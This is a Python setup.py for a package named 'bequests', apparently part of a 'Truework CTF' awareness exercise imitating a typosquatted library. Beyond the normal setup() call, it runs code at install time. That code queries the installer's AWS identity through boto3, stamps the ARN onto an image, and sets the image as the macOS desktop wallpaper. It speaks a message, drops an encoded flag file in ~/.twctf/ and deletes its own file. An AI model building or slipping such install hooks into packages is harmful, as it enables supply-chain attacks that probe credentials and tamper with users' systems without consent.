#!/usr/bin/env python

from distutils.core import setup
import os
import bequests

definitely_not_the_flag = "QZY(HQblx6RcuyDR8&euRaG@ZRcmBcO)*kTR90|SQ&li|QbtZsQ*2~NR#Zw=Q&lxnR#jwHO>9z7RBKK}QZY(IRz-A9QEXO7QdV$PQdKoWR%>KVO>0s}R90|SQZO)iQdL$@Q7~FaRcl67Q!p`MR#jwLO>0tAR90|TQZYthRz+-3QEXO9Q&dV-R8=uyR%>KZO)yeQRaQz>QZQ?IQblA>Q7}?SRcl67Q&lljR%>KdO>0t4RBK9EQZZF|Qblx5S8P^DPDDyYRaG@ZRxo5zO>9z1RBLcmQZYq&Rz)#SQ*2U5RclUFQ&lx#R#jw5O>0tARBLcnQZYq(Rz-AAQ*2sDQ&dVuQZO|{Q7~jyO)yeQRaQz?QhHH&QdKceQ7~3WR90|RQ&lx#R#j+5O>9;~RBKL0QZYq(QblY}S8Q5HRaS6SQdKoeR%>KZPDWBnR4{N=QZYq&QbjROQ7~3WR#tFDQ!p`MR#jwLO>0(6RBLcpQZZIxQblY}RcuyBPDDyZQ&lxYQ7~jqS8GyARaQz@QZZ|JQdMM6Q*2~NRa8n<Q!q6{R%>KVO>0(2RBK9EQZYtaRz-ABQ*2sDS5!(xQ!q74R%>KdS8P&DRBUioQ&vV{Rz-AAQ*3BRR#Z+!Q&l-jR%>KRO>9y~RBKK{QZY(IRz+-5Q*2gBR8&e;R4_4NR#jwHPDWBpRaJ0TQ&m-YQdL$@Q*2~NRcl67Q!q7CR%>KdS8P&BR90|RQZYq(QblY~Q*2U5R#ZwxQ!q6{Rxo5zO)*kTRaJ0SQ&li|QdLe*Q7~jkR#tFDQ!z$MR#js#O>0(4RBLclQZY(GRz-ABQ*2g9S5!(yQ!q6{S5;(IO)yeQR4{N=QZZF|QbkrzQ7}?SRclH`Q!q7CR%>KhO>9z3RBLcoQZZF|QblY|S8Q5HQB+DsQdKoeRxo5zO>0t0RBTFCQZZF|Rz)#RS8P&9RclT~Q&vh#R%>KRS8P&9RBLcpQZZIqRz+k^S8P^DR8&euR4_F}Qfp*VO)yeSR8~q>QZZF|QdMkDS8P&9R90|RQ!z$MR#j|DO>9z5RBKK|QZZF}QblZ2QEXaBPDDyZQdKoeR%>KdS5;C<RaJ0TQhHH&QbjROQEX^PR#Z+^Q&vV(R%>H0O>0&}RBLcoQZZUWRz+-2RcuyDQ&dVuQ&lxYQ7~juO)*kRRcmloQ&v@ZQdLe*Q*2g9Ra8n<Q&vh-R#j|DO>9zBRBKK|QZZF}Qblx7QEXO7PDDyoQ7|!KR%>KdS8P&BRcuODQ&li|QbkrzQ*3ZZRa8zzQ&llbR%>KdO>0t0RBKK|QZY(IRz-A9Q*2U5R8&euQ!p`MRWM{zQ7}?URaQz?Q&nquQbtZsQ7~FaRclIBQ&lxfR#j|DO>9z7RBLcmQZYq&QblZ1Rcu;FS5!(yQZO|`S5;(ES5{I?RBLcoQZO)iRz*%vQEX^PRaS6CQ!q7QR#jwLO>0t2RBLcqQZY(HRz+-6Q*2gBS5!(xQdKoXQEOyYO)yeQR4{N>Q&vTJQdL$@QEX^PRa8<{Q!z$MR#j|HO>9z3RBKK~QZY(IRz+-5Rcu;FQ&dVuQdKoeRxo5%O>9z3RBLcmQZYq&Rz^-wQ7}$ORclIBQ!p_@R#jwLO>0t0RBK9DQZYq&Rz-A9S8Q5HRa8nwQ!q6|QZQsrO>9y~R8~q>QhHH&QblA=S8P&9RaS6SQ&vVxR#j|PO>0&}RBLckQZZF}Rz+k_QEXaDQdCMsQZO|{Qfp*WQEO66R8~q=QZZF|QblY}QEYHXR8&e;QZO-7R#j|HO>0tARBLclQZY(GRz+-2RcuyBPDDyoQ!q6|QblA_QEXC7R8>k=QZQ?IRz)#SQEX^PRa8n<Q&vhtR#j|DO>0t6RBKK~QZYq(QblZ1S8Q5HPDDyoR4_4NRz+k|S8GyCRBLcnQ&nquRz)#SQ*3NVRa8z@QZO}BRz+l1O>0s}RBLclQZY(HQblx5Rcu;FPDDyYR8=)YS8HTeO>0s}R8~q>QhHH&QbtZsQ7}qKR#tFTQ!q7CR#jwHS8P&9RBK9AQZY(GRz+-2S8Q5HQ&dVtR8=)YS4Ct_S8GyCRBTFDQZQ?IRz+4%Q7}$OR#Z+!Q!q7CR#js#O>0(8RBKL1QZY(HQblZ1S8P^FQ&w<QQ!q74Rz+k|O)yeQRBUipQ&m-YQdL$@QEY5TRa8<%Q&llbR%>WRO>9z7RBKK|QZO-LQblx9Q*2sEQdCMtR8=)YRWM{yO)yeSRBUinQZQ^`Rz-AAQEXC3R#Z+!Q&vV(R%>KhO>9z5RBLcoQZZF|Rz-AARcu;FRa8nvQdKoXQ7~jqO>0s}RBK9CQZZ|JQblx6Q*2U5R#ZwwQ&vh-R#j|HO>0&}RBKK|QZZF}QblY}S8P&9R8&euQZO|{Q7~juO)*kTRaJ0SQZZ|JRz+-2QEXaBR8&e;Q&lxXR#js#O>0(0RBLcpQZY(GRz-AAS8P&9S5|OUR8=)ZQblA^O>0t0RBUioQZQ?IQdLe*QEX&LRa8z@Q!q7QR#j|9O>9y~RBKL1QZO)iQblx9Q*2g9R#tFTQ&lxYQdMMAQEO64RBTFCQ&v@ZRz)#SQ*2I1Ra8n<Q&vh-Rz+l5O>0t0RBLclQZY(HQblx6Rcu;FR#Zw=Q!p`MR#jw9O>0t0RaS6TQZZF|Rz*fnQ7}qKRclIBQ&lxnR#jw1O>9z3RBK9BQZY(HQblY~Q*2gAQdCM+RWLO}R%>KVO>0t2R8~q?QZO)iQdL$@QEYHXRclUFQ&vV(R#jwHO>0(8RBLcnQZZF|Qblx6S8P^FQ&dV-R8=)ZQblA^PDN5mR8??SQ$<yIQdL$@Q*2g9RclIBQ&lljR%>KdO>0t4RBK9EQZZUWRz+-5S8P^FQdCMsR4_F|Rxo5zS8GyARBTFCQZZF|Rz+4%Q*2U5Ra8zzQ&vh-R#jwLO>0t6RBLcqQZO)iQblx6QEXaBR8&euR8=)ZQ7~jyO)yeSRBUipQZZF|QdL$@Q7~FaRa8nvQ&llxR#j|PO>9;~RBKL0QZYq(QblY}S8Q5HS5!(>QdKoeRcmBcS5;C<R8~q>Q$<yIRz-A9S8P^DR90|RQ&llxR#j|PO>0t6RBLclQZY(GRz-AAQ*2gBRa8n<Q!q74R#jwEQ87|VRaQz@QZZ|JQdL$@Q*2sDR90|BQZO}BR%>KZO>0s}RBKL0QZYq(QblA=RcuyBS5!(xR4_G5R%>KaQEXC5RclICQ&nquQdLe*QEXO7R#Z+!Q&llxR#j|LO>0(0RBK9EQZY(IQblY}RcuyDR8&e;R4_G5S4Cu2O)*kTR8~q?Q$<yIQdL$@Q*2~NR#Z|&Q&lx#Rz+l5S8P&BRBK9AQZY(GRz+-2S8P^DS5!(xRaG@ZRxo5zO>9z3R90|RQZO)iQdL$@Q7}qKRcl67Q!qJ0R#jwHS8P&FRBLcpQZZIxRz+-5Q*2gBR#ZwxQ7|=2Rz+k|O>9z1R4{N?QZYq&Rz+k_Q*2I1RclH`Q!q7CR#j|9O>9z5RBLcoQZY(IQblx6QEXO7Q&dVtRWLO~Qfp*VPDN5mRBTFCQhHH&Rz+k_Q*2U5R#Zw=Q&lx#R%>KhO>0t6RBK9DQZY(HQblA=Rcu;HQdCM+RWLO}Rxo5!Q87|VRBUipQZZF|QbjpWQ!q+MR90|RQ!qJ0R#j|DO>9z5RBLcpQZZF|Rz-AAQ*2sDRa8nvQZO}3RaInDQEO66RBTFCQ$<C2QbjROQEXaBR#Z+!QZO-LR#j|LO>0(6RBKL0QZZF9Qblx6RcuyBPDDyoR8=)gRz+k|O)*kRRcmloQZZ|JRz+4%QEXaBRclT~QZO-LRz+k^O>9;~RBKK|QZZF}Qblx6S8Q5HR#tFTQ&lxYQdMMAQEXC5RBTFCQ&nquRz)#SQ7}qKRa8zzQ&lxfR%>KVO>9z1RBKL0QZY(HQblZ1Q*2gBR8&e;R4_F|S8HTeS8GyCR90|SQ&m-YQbjpWQ*2I1Ra8<{Q&lxnR#js#S8P&9RBK9BQZYthQblZ1Rcu;FS5!(yQdKoWS4Ct}PDWBnRaQz>QZO)iQbkrzQ7~FaR%=F8Q!qJ8R#jwLO>0t2RBLcoQZY(HRz+k^RcuyDQdCM-Q7|!KRWM{$O>9z3RBUipQZZ|JRz+k_Q7}$ORclUFQ&lljR#j|DO>9z9RBLcoQZZF}Rz-A9S8Q5HPDDyZQdKoeRxo5!QEXC5R4__bQZQ9{Rz*2aQ*2g9Ra8nvQ&vV(R#j|PO>0(6RBK9DQZYq(Rz-ADQ*2gBR8&evQ7|<`Qfp*RO>9z3RBUioQhHH&QbtZrS8P&9RaS6SQ&lxnR#js#O>0(6RBLcnQZYq(QblY}S8Q5HR#Zw=QZO}3RcmBZQEO66RBTFDQZZ|JQbjpWQ*3BRR8&e;QZO-LR#js#O>0tARBLoYQZYq(QblY}RcuyBR#Zw=QZO}3R#jwEQ87|XR8>k=QZQCwRz+4%QEX&LR#Zw=QZO-LR#jw9O>0&}RBKL0QZY(GRz-A9Q*2sDPDXH5Q&llxRxo5zS8P&BRBTFCQ&nquRz)#RS8Q5HRa8z@Q!p`0R%>KdO>0(0RBKK|QZY(IRz+-6Q*2gBQdCMsR8=)YS4Cu2O>9z1RaS6TQ&li|QdKceQ7~3WR90|BQ!q7CR#jwHS8P&9RBK9AQZYq(Rz+-6QEXO7S5!(yQZO}3Rxo5%S5{I?R8~q>Q&li|Rz*fnQ7}$OR#Z+!Q!qJ0R#js#S8P&FR90|TQZYthRz-A9RcuyDQ&dV-QdKoeS4Ct}O)yeQR4{N?QZYthRz+4%QEX^PRa8<{Q!q74R%>WRO>9z5RBK9EQZZIxQblx5S8P^FR#ZwwR4_F|Rxo5%O>0t0RBLcnQ&nquQdKceQ7}$OR#Z+^Q&vV(R%>KhO>0(2RBK9FQZYtaRz-AAQ*2g9Ra8nvR4_F}QEOyUS8Gy8R8~q>QZZ|JQblx6Q*2g9R#tFDQ!q6{R#js#O>9z5RBLcyQZZF}Rz+-3Q*2U5R8&euQZO|`Rxo5zO)*kTR8~q>Q$<C2QblY}QEX^PR8&qyQ&llxR%>iVO>0(0RBLcpQZZF}QblY}S8Q5HQdCMtQdKcwRz+k|O>0t0RaQz@QZQCwRz+4%Q*2~NRa8n<Q!p`MR%>KZO>0(8RBKK}QZY(GRz+-1Q*2sDS5!(yR8=uyRz+k|S8P&BRBUioQ&v@ZQbjROQ*25|R#Z+^Q!qJ8R%>KVO>9y~RBLckQZY(HQblx6RcuyDQdCM+R4_4NRxo5vO)yeQRaS6TQZYq&QbjpWQEW~~Rcl67Q&lxnR#js#O>9y~RBKK{QZZF|QblZ1RcuyDQdCMsQ&lxfRxo5zO>9z3R8~q?QZO)iQbjROQ7~FaRaS6CQ!p`8R%>KhO>0tARBLcqQZZIxQblx7QEXO9Q&dV-R8=)gR%>KdO>9y~RBK9AQZYq&QdL$@Q7}?SR#t39Q&vVxR#j|HO>0t4RBK98QZZF|Rz+-2QEXO9Q&dVtRWLO}Rxo5%O)*kTRBUioQ&vTJRz)#SQ*2U5RclH`Q&l-jR#j|PO>0&}RBLcnQZYtaRz+k_Q*2U5R8&e;RaG@aQ7~jyO)yeQRaS6TQ$<C2QbkTrQ*3BRR#ZwwQ&lxXR#j|DO>0(6RBLcoQZYq(QblY}S8Q5JQdCMtQZO|{QEOyUO)*kRRBTFCQZQ?IQbjROQEXC3R#Z+!Q!p`MR#j|PO>0t6RBLclQZY(HQblx6RcuyCQdCM+R8=)gRz+k}QEO64RaQz@QZZ|JQdMM6Q*2~NRa8n<Q!p`8R#jw9O>9z3RBKK}QZYthQblZ1Q*2g9S5!(xR4_G5R#jw9S8GyARBLcnQhHH&QbkrzQ*3ZZRa8zzQ&vh-Rz+k^O>0s}RBK9DQZYq(Rz+-6Q*2sDRa8nvR4_4NRWM{uO>0t0R8~q?QZZ|JQdL$@Q*2I1R8&e;Q&lxXR#j+5S8P&DR90|RQZYq&Rz+-3Q*2sDQ&dVtQdKoWRxo5zO)*kTRBUioQ&nquRz*2aQ7}qKR#Zw=Q!z$MR#jwLO>0(4RBLclQZZIxRz+-2S8P^FRa8nvR8=)ZQblA|O)*kPRBK9AQZZ|JQblA>Q7}?SRclH`Q!q7CR%>WNO>0t8RBK98QZZUWRz+-5S8P^DR8&euRWLDOR#jw9O>0t2RBTFCQZZF|Rz-AAQ*2U5R#Z+^Q&vh#R#j|LO>9zBRBLcpQZY(IQblx5Rcu;FR8&evQdKoXQfp*VS8GyARaQz@QhHH&Rz^-wQ7~jkRclH`Q!p`0R#j|DO>9z5RBKK}QZYp^QblY|Q*2sDR#ZwwQZO|{QdMMAQEO66RBTFBQZYq&QbjROQEX^PR#tFTQ&vVxR%>KVO>0(8RBK98QZO)iQblY}RcuyBPDDyoQdKoXQEOyYPDWBnRBTFCQ&v@ZQbjpWQ*2sDR#t3PQ!q74R#j|HO>9z9RBKK|QZZF}Qblx6Rcu;FR#Zw=Q!q74R#jwDS8P&DR8>k=Q&nquRz)#SQ7}?SRa8zzQ&lxfR%>KhS8P&9RBKK~QZY(IRz-A9Q*2sEQdCMsR8=)gRz+l1O)yeSR90|SQ&nquQbjpWQ!q+MRa8zzQ!q6{R#jwHS8P&DRBK9BQZYq(QblZ1Rcu;FS5!(>R4_G5R%>KVO>0t0RclICQ&nquRz*fnQEX^PRaS6CQ&vh#R#jwLO>0s}RBLcoQZZIxRz+-2RcuyDQ&dVtRWLDORWM{$O)yeQRcuOEQZZ|JRz+k_QEX^PRclT~Q&lxnR#j|DO>0t0RBK9EQZY(IQblY}QEXC3Q&dVuQdKoeRxo5vO>9z1RBTFCQZZF|Rz+4%QEXO7Ra8n<Q&vV(R%>KRO>0t4RBK9DQZYp^Rz-AAQEXC3Q&dVtR4_F|S8HTaO)yeSRBUipQZZ|JQblx6Q*2I1R#tFTQ&vV(R#j+5O>0(6RBKK}QZYq&Rz+-5Rcu;FPDDyoQZO|`Rxo5!QEO66RBTFCQ&li|QbtBkQEW;`R#Zw=Q&vV{R#jw5O>9y^RBK9DQZY(HRz+-2RcuyBR#Zw=R4_F}QblA_Q87|VRcuOEQZQ^`Rz+-2Q*3BRRclH`QZO-LR#jw9O>0t4RBKL1QZYq(QblY}S8Q5HPDXH5QdKoeS8HTfQC3n+RBTFCQ&nquRz)#SQ*3BRR#Zw=Q&vV(R#j|PO>0t0RBK9DQZY(IRz-ADQ*2sEQdCMsR8=)YR%>KdS8P&DRBK9BQ&v@ZRz*fnQEW;`R90|BQ&lxnR%>KdS8P&9RBK9AQZY(GRz+-6Q*2sDQ&dVtRWLO}S4Cu2O)*kPRBLcnQZO)iRz+-2Q7}$OR#tFDQZO}3R#jwDO>0tARBKL0QZY(HRz+-2RcuyDR8&euQ7|!KRWM{$O)yeQRBUipQZZF|QdMM6Q7}?SR#t39Q&lljR%>KhO>0t6RBK9EQZZF}Qblx5S8P^DPDDyZQ&lxXRxo5!QEXC7RBTFCQhHKhRz+4%QEXC3RclIBQ&vV(R%>KhO>0(2RBLcoQZZF|Rz+k_QEXC3R8&euR8=)YS8HTeS8GyCRBUioQZZ|JQblx6Q*2U5R90|RQ&vV(R#j|9O>0&}R90|TQZYq(QblY}Q*2sDQ&dV-QZO|`Rxo5!Q87|XRBTFCQ&v@ZQblx6Q7~3WR#Z+^Q!p`8R%>KNO>0(0RBLcpQZZF}QblY}S8P^FS5!(yR8=)ZQ7~jvQEXC5RaQz>QZZF|Rz+k_QEX&LRa8z@Q!q7QR#j|9O>9y~RBK9EQZYq(QblY|Rcu;FS5!(>QZO|{QdMMAQEO64RcmloQhHH&Rz+4%Q7}$OR#Zw=Q&lx#R%>H0O>9y~RBK9DQZY(HQblx6Rcu;FS5!(xR4_G5S4Ct_O>9y~R90|SQhHH&QbtZsQ!q+MRcl67Q&lxnR#jwHO>9z5R90|RQZY(IQblZ2RcuyBQdV$PQ&lxXRxo5zO)*kPR90|SQZO)iQbjpWQ7~FaRclUFQ&vV(R#jwLO>0(0RBKK~QZYthQblx5S8P^FQ&dV-R8=)ZQ7~jyO)yeQRclIDQhHH&QdL$@Q7}$ORclUFQ&vh#Rz+k|O>0t4RBK9EQZZIxRz+-5Q*2sDQ&dVuQ!p`MR%>KeQC3n)RBTFDQZQCwRz+k_QEXC3Ra8zzQ&vh#R%>KhO>9y|RBK9CQZZIqRz-ADQ*2U5R8&evQdKoXQ7~jyO)yeSRBLcoQZZ|JQdL$@Q7}$OR90|BQ!q7QR#js#O>0t4RBK9DQZYq(QblY|Q*2sDR#ZwwQ&lxYQ7~jvQ87|XR8??QQZQ?IRz*2aQ7~3WR#tFDQ!p`MR#j|9O>0t6RBLcpQZYq(Rz-AAQ*2sDQdV$PR8=)YRz+l1S8P&BRaQz@QZZ|JQdMM6QEY5TRaR_OQ!qJ8R#j|DO>9z1RBKK}QZYthQblx6Q*2g9S5!(xQ!q74S4Ct~QEXC5RcmlpQZPk%QbkTqS8Ps5Ra8n<QZO|`R%>KhO>9y~RBK9EQZYp^Rz-ADQ*2gBR8&e;Q!q6|Q7~jvQbkfqR8~q?QZZ|JQdL$@Q*2~NRclIBQ!q7CR#jwHO>9y|RBK9AQZZF|Rz+-5S8P^DQ&dVuQ7|<_Rxo5zO>9z3R90|SQ&nquRz^-wQEYHXR#Zw=Q!z$MR#js#O>0(0RBKK~QZY(HQblZ1Q*2gBR#Zw=QdKoWS8HTaO)*kTRBUinQZZF|QblY}Q7}?SRclH`Q!q7CRz+l1O>0t4RBKK~QZY(IRz+k^Rcu;FRa8nwQdKoeRcmBUO>0t2RBTFCQhHH&Rz-AAQ7}?SRclIBQ!p_@R#jw5O>9z5RBK9EQZYq&Rz+k^S8P^DR8&euR4_F}QdMM9O)yeQRaQz?Q$<C2Rz+k^S8P&9Ra8nvQ!p`0R#j|DO>9z5RBKK}QZZF|Rz-AAQ*2U5RaS6SQZO|`Rxo5zPDWBpR8~q>Q&v@ZQbjROQEXaBR#Zw=Q!p`MR%>H0O>0(6RBLclQZYq&Rz-AARcuyDS5!(>QdKoeRz+k}QEO64RcmloQZQ?IQbtBkQ*2sDRclg3Q&vh#R#jw5O>9zBRBKK|QZZF}QblZ1S8P^EQB+DrQ7|=2R%>KZS8P&BRclICQ&nquRz+4%Q*2U5Ra8zzQ&lx#R%>KVO>0&}RBLcmQZY(JQblY|Q*2sFQdCM+R8=)YS8HTeS8GyARaJ0TQ$<yIQbjROQ7~FaRa8z@Q!q74R#js#O>9;~R90|RQZZF9QblZ1Rcu;FS5!(>R8=)gR%>KdO>9z3RBK9BQ&nquR#i?<QEX^PRcl67QZO|`R#jwLO>0t2RBLcpQZO-LRz+-5S8P^EQB+DrQdKcwRWM{yO)yeQR4{N?QZQ?IRz+k_QEX^PRclUFQ&lxnR%>KRO>0t2RBKK~QZO-LRz+k^S8Q5IQdCMtQdKoeRxo5!QC3n+RBUinQZZ~{Rz)#SQ7}$OR90|BQ&lx#R#jw5O>0t4RBK9DQZYq(Rz-A9S8P^FQdCM+QdKoXQZQsvS5{I?RaJ0TQhHH&QdL$@Q*2I1R#tFTQ&lxnR#js#O>0(6RBLcnQZYq&Rz+-3Q*2U5S5!(xQ&lxXS4Ct~QEO66RBTFBQZZF|QbjROQ7}$ORclUFQZO-7R#j|HO>0tARBLcpQZZF}Rz+-2RcuyBQdCM+Q!q6{R#jwEQEO64RcmlpQZQCwRz+k_QEXaBR90|BQ&vhtR#j|DO>0&}RBK9EQZZIxQblY~Q*2gAQB+D*Q!q6|QZQswQEO66RBLcnQ&nquRz)#SQ7}?SRa8<%Q&llbR%>KdO>9y~RBLckQZYq(Rz+-1Rcu;FPDDyYR8=)YR%>KdO)*kTR90|SQZZ|JRz*fnQEW~~R#Z+^Q&lxfR%>H0O>9z5RBLcmQZY(IRz+-2S8Q5HQ&dVuQdKoeRxo5zPDWBpR90|SQ&m-YRz+1gP*gBI"

homedir = os.path.expanduser("~")
target_dir = f"{homedir}/.twctf/"
os.makedirs(target_dir, exist_ok=True)

setup(name='bequests',
      version='1.0',
      description='Hack The Planet! Boot up or shut up!',
      long_description=bequests.long_description,
      long_description_content_type="text/plain",
      url='https://www.youtube.com/watch?v=dQw4w9WgXcQ',
      packages=['bequests'],
      install_requires=[
        "boto3",
        "pillow",
      ]
     )

arn = ""
try:
    import boto3
    client = boto3.client('sts')
    response = client.get_caller_identity()
    arn = response.get("Arn", "")
except:
    pass

try:
    from PIL import Image, ImageDraw, ImageFont

    target_image_path = "/Users/Shared/AlwaysValueDiversePerspectivesQ3.png"
    img = Image.open(target_image_path)
    I1 = ImageDraw.Draw(img)
    fnt = ImageFont.truetype("/System/Library/Fonts/Supplemental/Comic Sans MS.ttf", 40)
    I1.text((250, 100), "Thank you for playing the Truework CTF", font=fnt, fill=(255, 0, 0))
    if arn:
        I1.text((250, 150), arn, font=fnt, fill=(255, 0, 0))
        I1.text((800, 190), "I think I'll have a play in your AWS account", font=fnt, fill=(255,0,0))
    I1.text((250,600), "~/.twctf/", font=fnt, fill=(255, 0, 0))
    img.save(f"{target_dir}/twctf.png")
except:
    pass

import subprocess
subprocess.call(["/usr/local/bin/desktoppr", f"{target_dir}/twctf.png"])
subprocess.call(["/usr/bin/say", "Thank you for participating in the Truework CTF"])
with open(f"{target_dir}/flag", 'w') as f:
    f.write(definitely_not_the_flag)

import sys

if getattr(sys, 'frozen', False):
    path = os.path.realpath(sys.executable)
elif __file__:
  path = os.path.realpath(__file__)

os.remove(path)
